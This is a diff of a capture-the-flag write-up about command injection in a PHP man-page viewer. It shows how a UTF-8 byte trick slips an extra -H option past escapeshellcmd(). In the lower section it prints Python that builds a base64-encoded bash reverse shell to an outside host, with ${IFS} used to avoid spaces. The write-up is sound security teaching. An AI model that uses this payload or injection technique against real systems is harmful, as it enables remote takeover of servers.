@@ -1,4 +1,4 @@
-This challenge is a PHP application that renders a man page for a given command as HTML. The command is taken from the query string and passed as an argument to `/usr/bin/man` via `shell_exec()`:
+This challenge is a PHP application that renders the man page for a given command as HTML. The command is taken from the query string and passed as an argument to `/usr/bin/man` via `shell_exec()`:
 ```php
 $arg = $_GET['page'];
 [...]
@@ -8,7 +8,7 @@ $manpage = shell_exec('/usr/bin/man --troff-device=html --encoding=UTF-8 ' . $ar
 This would be a straight-up RCE, if it wasn't for an ad-hoc query sanitizer slapped on top of this:
 
 1. Quotes of all kinds are stripped right away: `$arg = mb_ereg_replace('["\']', '', $arg);`.
-2. If there is a non-word characters at the beggining of a token (`if (mb_ereg('(^|\\s+)\W+', $arg) [...] ) {`), they are also stripped: `$arg = mb_ereg_replace('(^|\\s+)\W+', '\\1', $arg);`. This prevents us from passing additional funny `-Options` or `--options` to `/usr/bin/man`.
+2. If there are non-word characters at the beggining of a token (`if (mb_ereg('(^|\\s+)\W+', $arg) [...] ) {`), they are also stripped: `$arg = mb_ereg_replace('(^|\\s+)\W+', '\\1', $arg);`. This prevents us from passing additional funny `-Options` or `--options` to `/usr/bin/man`.
 3. Finally, `$arg = escapeshellcmd($arg)` escapes pretty much everything we could use in a shell command for malicious purposes.
 
 At first glance, this seems surprisingly solid. But, unfortunately for the author of the sanitizer and fortunately for us, the challenge tries to use UTF-8:
@@ -53,9 +53,10 @@ In fact, strings in PHP are just old-school byte sequences. All `mb_internal_enc
 ?>
 ```
 
-Great, so allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from, but the most obvious one is `-H`. It allows us to specify a web browser to view the man page, which [gets us](get_shell.py) a reverse shell:
+Great, so this allows us to smuggle an additional option to `/usr/bin/man`. There are plenty to choose from, but the most obvious one is `-H`, which allows us to specify a web browser to view the man page. `escapeshellcmd()` still escapes everything, but that escaping only works for the shell that PHP runs to execute `/usr/bin/man`. The shell that `/usr/bin/man` itself spawns to invoke the browser will see unescaped characters. This [gets us](get_shell.py) a reverse shell:
 ```python
 REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
+# Space is not escaped by escapeshellcmd(), so we have use $IFS here.
 SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
 CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'
 
